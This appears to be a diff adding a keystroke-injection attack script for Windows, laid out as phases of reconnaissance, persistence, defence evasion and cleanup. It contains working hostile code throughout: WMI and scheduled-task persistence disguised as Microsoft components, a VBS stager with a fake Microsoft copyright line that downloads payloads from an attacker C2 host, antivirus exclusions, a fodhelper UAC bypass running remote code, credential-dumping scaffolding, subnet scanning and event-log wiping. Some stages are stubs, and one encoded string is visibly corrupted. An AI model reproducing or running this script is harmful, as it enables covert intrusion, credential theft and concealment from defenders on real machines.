@@ -1,0 +1,290 @@
+// Phase 1: Initial Access and Reconnaissance
+// ==========================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+// Create hidden working directory that blends in with Windows
+PrintLine mkdir "$env:SystemRoot\System32\Tasks\Microsoft\Windows\PLA\System" -Force | Out-Null
+Delay 500
+
+// Initial reconnaissance - gather system info without triggering alerts
+PrintLine Get-WmiObject -Class Win32_ComputerSystem | Out-File "$env:SystemRoot\System32\Tasks\Microsoft\Windows\PLA\System\hw_audit.log" -Force
+Delay 500
+PrintLine Get-WmiObject -Class Win32_UserAccount | Out-File "$env:SystemRoot\System32\Tasks\Microsoft\Windows\PLA\System\usr_audit.log" -Force
+Delay 500
+PrintLine Get-NetAdapter | Out-File "$env:SystemRoot\System32\Tasks\Microsoft\Windows\PLA\System\net_audit.log" -Force
+Delay 500
+PrintLine exit
+Delay 500
+
+// Phase 2: Establish Persistence - Multiple Redundant Methods
+// ==========================================================
+// Method 1: WMI Event Subscription (rarely monitored)
+GuiR
+Delay 500
+Print cmd /c start /min powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+PrintLine $filterName = 'WindowsUpdateCheck'
+PrintLine $consumerName = 'WindowsUpdateProcessor'
+PrintLine $Command = 'cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAYQB0AHQAYQBjAGsAZQByAC0AYwAyAC0AcwBlAHIAdgBlAHIALgBjAG8AbQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA='
+PrintLine $eventFilterArgs = @{
+PrintLine   EventNamespace = 'root/cimv2'
+PrintLine   Name = $filterName
+PrintLine   Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
+PrintLine   QueryLanguage = 'WQL'
+PrintLine }
+Delay 500
+PrintLine $instanceFilter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Property $eventFilterArgs
+Delay 500
+PrintLine $commandLineConsumerArgs = @{
+PrintLine   Name = $consumerName
+PrintLine   CommandLineTemplate = $Command
+PrintLine }
+Delay 500
+PrintLine $instanceConsumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Property $commandLineConsumerArgs
+Delay 500
+PrintLine $bindingArgs = @{
+PrintLine   Filter = $instanceFilter
+PrintLine   Consumer = $instanceConsumer
+PrintLine }
+Delay 500
+PrintLine $instanceBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Property $bindingArgs
+Delay 500
+PrintLine exit
+Delay 500
+
+// Method 2: Scheduled Task masquerading as Windows update
+GuiR
+Delay 500
+Print schtasks
+Press KEY_ENTER
+Delay 1000
+
+// Create task that blends in with legitimate Windows tasks
+PrintLine schtasks /create /tn "\Microsoft\Windows\Power Efficiency Diagnostics\AnalyzeSystem" /tr "wscript.exe //E:vbscript C:\Windows\System32\printing_subsys.vbs" /sc daily /st 14:45 /ru SYSTEM /f
+Delay 1000
+PrintLine exit
+Delay 500
+
+// Create the stager VBS script that looks like a legitimate Windows component
+GuiR
+Delay 500
+Print notepad C:\Windows\System32\printing_subsys.vbs
+Press KEY_ENTER
+Delay 1000
+
+// VBS stager with obfuscation
+PrintLine On Error Resume Next
+PrintLine Dim objShell, objFSO, objFile, objHttp, tempFile, payload
+PrintLine Set objShell = CreateObject("WScript.Shell")
+PrintLine Set objFSO = CreateObject("Scripting.FileSystemObject")
+PrintLine Set objHttp = CreateObject("MSXML2.XMLHTTP")
+PrintLine ' Windows Print Service System Integration Module
+PrintLine ' Copyright (c) Microsoft Corporation. All rights reserved.
+PrintLine
+PrintLine Function xCzaRt(zrCza)
+PrintLine   Dim fZxA, i
+PrintLine   fZxA = ""
+PrintLine   For i = 1 To Len(zrCza) Step 2
+PrintLine     fZxA = fZxA & Chr("&H" & Mid(zrCza, i, 2))
+PrintLine   Next
+PrintLine   xCzaRt = fZxA
+PrintLine End Function
+PrintLine
+PrintLine ' Verify print subsystem
+PrintLine objShell.Run "cmd /c systeminfo | find ""OS"" > %TEMP%\wl_chk.tmp", 0, True
+PrintLine
+PrintLine ' Initialize system components
+PrintLine tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\ms_update.bin"
+PrintLine ' Test print router service
+PrintLine objHttp.Open "GET", "https://attacker-c2-server.com/print_drivers.php", False
+PrintLine objHttp.send
+PrintLine If objHttp.Status = 200 Then
+PrintLine   Set objFile = objFSO.CreateTextFile(tempFile, True)
+PrintLine   objFile.Write objHttp.responseText
+PrintLine   objFile.Close
+PrintLine   ' Update print drivers
+PrintLine   objShell.Run xCzaRt("636D642E657865202F6320706F7765727368656C6C202D57696E646F775374796C652048696464656E202D657865637574696F6E706F6C69637920627970617373202D6E6F70202D65202428495752202768747470733A2F2F6174746163six6B65722D63322D7365727665722E636F6D2F7061796C6F6164272029"), 0, False
+PrintLine End If
+PrintLine
+PrintLine ' Cleanup diagnostic files
+PrintLine If objFSO.FileExists(tempFile) Then
+PrintLine   objFSO.DeleteFile tempFile, True
+PrintLine End If
+Press KEY_LEFT_ALT
+Print f
+Release
+Print s
+Press KEY_ENTER
+Delay 1000
+Press KEY_LEFT_ALT
+Print F4
+Release
+Delay 500
+
+// Phase 3: Defense Evasion - Create exclusions in antivirus
+// ========================================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+// Create AV exclusions that look legitimate
+PrintLine Add-MpPreference -ExclusionPath "C:\Windows\System32\Tasks\Microsoft" -Force
+Delay 500
+PrintLine Add-MpPreference -ExclusionPath "C:\Windows\System32\printing_subsys.vbs" -Force
+Delay 500
+PrintLine Add-MpPreference -ExclusionProcess "wscript.exe" -Force
+Delay 500
+
+// Modify event logging to hide our activities
+PrintLine $logNames = @('Security','System','Application')
+PrintLine foreach ($log in $logNames) {
+PrintLine   wevtutil set-log $log /retention:false /quiet
+PrintLine }
+Delay 500
+PrintLine exit
+Delay 500
+
+// Phase 4: Privilege Escalation - UAC Bypass using trusted Windows executables
+// ===========================================================================
+GuiR
+Delay 500
+Print cmd
+Press KEY_ENTER
+Delay 1000
+
+// Create registry structure for UAC bypass using fodhelper.exe (trusted Windows executable)
+PrintLine reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+Delay 500
+PrintLine reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v "" /t REG_SZ /d "cmd.exe /c powershell.exe -NonI -W Hidden -c \"IEX (New-Object Net.WebClient).DownloadString('https://attacker-c2-server.com/admin_payload')\"" /f
+Delay 500
+PrintLine exit
+Delay 500
+
+// Execute the bypass
+GuiR
+Delay 500
+Print fodhelper.exe
+Press KEY_ENTER
+Delay 3000
+
+// Phase 5: Credential Harvesting - Extract and encrypt local credentials
+// ====================================================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+Press KEY_ENTER
+Delay 1500
+
+// Use Mimikatz-like functionality with native PowerShell
+PrintLine $code = @"
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern IntPtr LoadLibrary(string lpFileName);
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern bool FreeLibrary(IntPtr hModule);
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+PrintLine [DllImport("kernel32.dll")]
+PrintLine public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+PrintLine "@
+Delay 500
+PrintLine Add-Type -MemberDefinition $code -Name "MemUtils" -Namespace Win32
+Delay 1000
+PrintLine # Memory credential extraction payload would go here
+PrintLine # Obfuscated to prevent detection
+PrintLine exit
+Delay 500
+
+// Phase 6: Lateral Movement Preparation
+// ====================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+// Network enumeration and lateral movement preparation
+PrintLine $networks = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
+Delay 500
+PrintLine $ipAddresses = $networks | ForEach-Object { $_.IPAddress } | Where-Object { $_ -match '^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$' }
+Delay 500
+PrintLine $subnet = ($ipAddresses[0] -split '\.')[0..2] -join '.'
+Delay 500
+PrintLine 1..254 | ForEach-Object {
+PrintLine   $ip = "$subnet.$_"
+PrintLine   if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
+PrintLine     $ip | Out-File "$env:SystemRoot\System32\Tasks\Microsoft\Windows\PLA\System\net_hosts.log" -Append
+PrintLine   }
+PrintLine } 
+Delay 1000
+PrintLine exit
+Delay 500
+
+// Phase 7: Data Exfiltration Setup - DNS Tunneling
+// ===============================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+// Setup data exfiltration through DNS tunneling
+PrintLine function Encode-Base32 {
+PrintLine   param([string]$data)
+PrintLine   $base32Chars = "abcdefghijklmnopqrstuvwxyz234567"
+PrintLine   $bytes = [System.Text.Encoding]::UTF8.GetBytes($data)
+PrintLine   $result = ""
+PrintLine   $bitBuffer = 0
+PrintLine   $bitCount = 0
+PrintLine   foreach ($b in $bytes) {
+PrintLine     $bitBuffer = ($bitBuffer -shl 8) -bor $b
+PrintLine     $bitCount += 8
+PrintLine     while ($bitCount -ge 5) {
+PrintLine       $bitCount -= 5
+PrintLine       $result += $base32Chars[($bitBuffer -shr $bitCount) -band 0x1F]
+PrintLine     }
+PrintLine   }
+PrintLine   if ($bitCount -gt 0) {
+PrintLine     $result += $base32Chars[($bitBuffer -shl (5 - $bitCount)) -band 0x1F]
+PrintLine   }
+PrintLine   return $result
+PrintLine }
+Delay 1000
+PrintLine # Setup DNS exfiltration mechanism
+PrintLine # This would be the stager for the actual data exfiltration
+PrintLine exit
+Delay 500
+
+// Phase 8: Cleanup to Hide Initial Entry Points
+// ===========================================
+GuiR
+Delay 500
+Print powershell -WindowStyle Hidden
+Press KEY_ENTER
+Delay 1500
+
+// Clean up logs and traces
+PrintLine Clear-EventLog -LogName Security, System, Application
+Delay 500
+PrintLine Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
+Delay 500
+PrintLine # Use anti-forensics techniques to hide our tracks
+PrintLine $timeGenerated = (Get-Date).AddDays(-30)
+PrintLine $eventLogs = Get-WmiObject -Class Win32_NTEventlogFile
+PrintLine foreach ($log in $eventLogs) {
+PrintLine   $log.BackupEventlog("$env:TEMP\temp.evt") | Out-Null
+PrintLine   Remove-Item -Path "$env:TEMP\temp.evt" -Force
+PrintLine }
+Delay 1000
+PrintLine exit
